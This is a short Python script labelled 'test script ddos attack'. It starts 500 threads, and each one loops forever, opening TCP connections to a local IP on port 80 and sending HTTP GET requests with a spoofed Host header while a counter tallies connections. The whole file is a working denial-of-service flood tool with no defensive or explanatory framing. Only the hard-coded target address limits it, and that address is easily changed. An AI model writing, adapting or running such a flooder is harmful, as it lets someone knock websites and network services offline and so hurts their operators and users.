"""
test script ddos attack
"""

import threading
import socket

target = '192.168.15.1'
port = 80
ip = 'www.google.com.br'

already_att = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

        global already_att
        already_att += 1
        print(already_att)
        if already_att % 500 == 0:
            print('total connect =', already_att)

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()

